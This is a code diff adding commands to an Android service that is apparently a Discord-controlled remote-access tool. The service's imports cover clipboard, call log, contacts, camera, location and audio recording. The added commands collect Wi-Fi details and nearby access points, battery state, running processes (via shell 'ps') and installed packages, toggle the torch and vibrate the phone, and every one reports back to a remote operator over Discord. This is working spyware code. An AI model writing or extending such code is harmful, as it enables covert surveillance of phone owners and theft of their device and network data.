@@ -8,17 +8,22 @@ import android.app.Service
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.database.Cursor
 import android.graphics.SurfaceTexture
 import android.hardware.Camera
 import android.location.Location
 import android.location.LocationListener
+import android.hardware.camera2.CameraManager
 import android.location.LocationManager
 import android.media.MediaRecorder
 import android.net.Uri
+import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.IBinder
 import android.os.Looper
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.util.Log
@@ -219,6 +224,126 @@ class MainService : Service() {
                     gatewayStarted = false
                     discord = null
                     startService(Intent(this@MainService, MainService::class.java))
+                }
+                "wifi" -> {
+                    val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
+                    val info = wm.connectionInfo
+                    val ssid = info.ssid?.removeSurrounding("\"") ?: "?"
+                    val bssid = info.bssid ?: "?"
+                    val rssi = info.rssi
+                    val speed = info.linkSpeed
+                    val sb = StringBuilder()
+                    sb.appendLine("WiFi: **$ssid**")
+                    sb.appendLine("BSSID: `$bssid`")
+                    sb.appendLine("Signal: ${rssi}dBm | Speed: ${speed}Mbps")
+                    sb.appendLine()
+                    sb.appendLine("**Scan Results:**")
+                    try {
+                        val scanResults = wm.scanResults
+                        if (scanResults.isNotEmpty()) {
+                            scanResults.sortedByDescending { it.level }.take(20).forEach { ap ->
+                                val lock = if (ap.capabilities.contains("WPA")) "🔒" else "🔓"
+                                sb.appendLine("$lock ${ap.SSID} (${ap.level}dBm)")
+                            }
+                        } else {
+                            sb.appendLine("(no scan results — try moving closer to AP)")
+                        }
+                    } catch (e: Exception) {
+                        sb.appendLine("Scan failed: ${e.message?.take(50)}")
+                    }
+                    d.sendMsg(sb.toString().take(1900))
+                }
+                "battery" -> {
+                    val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+                    val bStatus = registerReceiver(null, ifilter)
+                    if (bStatus != null) {
+                        val level = bStatus.getIntExtra("level", -1)
+                        val scale = bStatus.getIntExtra("scale", -1)
+                        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
+                        val temp = bStatus.getIntExtra("temperature", -1) / 10f
+                        val voltage = bStatus.getIntExtra("voltage", -1)
+                        val plugged = when (bStatus.getIntExtra("plugged", -1)) {
+                            1 -> "AC"
+                            2 -> "USB"
+                            3 -> "Wireless"
+                            else -> "Unplugged"
+                        }
+                        val health = when (bStatus.getIntExtra("health", -1)) {
+                            2 -> "Good"
+                            3 -> "Overheat"
+                            4 -> "Dead"
+                            5 -> "Over voltage"
+                            6 -> "Unknown"
+                            7 -> "Cold"
+                            else -> "?"
+                        }
+                        val status = when (bStatus.getIntExtra("status", -1)) {
+                            1 -> "Unknown"
+                            2 -> "Charging"
+                            3 -> "Discharging"
+                            4 -> "Not charging"
+                            5 -> "Full"
+                            else -> "?"
+                        }
+                        d.sendMsg(":battery: **Battery**\n```\nLevel : ${pct}%\nStatus: $status\nHealth: $health\nTemp  : ${temp}°C\nVolt  : ${voltage}mV\nPower : $plugged\n```")
+                    } else {
+                        d.sendMsg(":x: Battery info unavailable")
+                    }
+                }
+                "processes" -> {
+                    val result = shell("ps -A -o PID,USER,NAME --sort=-%MEM 2>/dev/null || ps -A 2>/dev/null || ps")
+                    val lines = result.lines()
+                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else result
+                    d.sendMsg(":microscope: **Processes**\n```\n$out\n```")
+                }
+                "installed" -> {
+                    val result = shell("pm list packages -3 2>/dev/null | sort")
+                    val pkgs = result.lines().filter { it.startsWith("package:") }.map { it.removePrefix("package:") }
+                    val total = pkgs.size
+                    val list = if (total > 40) pkgs.take(40).joinToString("\n") + "\n... (${total - 40} more)" else pkgs.joinToString("\n")
+                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n$list\n```")
+                }
+                "torch" -> {
+                    val mode = payload?.lowercase()
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        try {
+                            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                            val camId = cm.cameraIdList.firstOrNull { id ->
+                                val chars = cm.getCameraCharacteristics(id)
+                                val dir = chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE)
+                                dir == true
+                            }
+                            if (camId != null) {
+                                val on = mode == "on" || mode == "1" || mode == null
+                                cm.setTorchMode(camId, on)
+                                d.sendMsg(":flashlight: Torch **${if (on) "ON" else "OFF"}**")
+                            } else {
+                                d.sendMsg(":x: No flash available")
+                            }
+                        } catch (e: Exception) {
+                            d.sendMsg(":x: Torch failed: ${e.message?.take(50)}")
+                        }
+                    } else {
+                        d.sendMsg(":x: Torch requires API 23+")
+                    }
+                }
+                "vibrate" -> {
+                    val ms = (payload?.toLongOrNull() ?: 1000L).coerceIn(100L, 10000L)
+                    try {
+                        val vb = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                        if (vb.hasVibrator()) {
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                vb.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
+                            } else {
+                                vb.vibrate(ms)
+                            }
+                            d.sendMsg(":loud_sound: Vibrated for ${ms}ms")
+                        } else {
+                            d.sendMsg(":x: No vibrator found")
+                        }
+                    } catch (e: Exception) {
+                        d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
+                    }
                 }
             }
         } catch (e: Exception) {
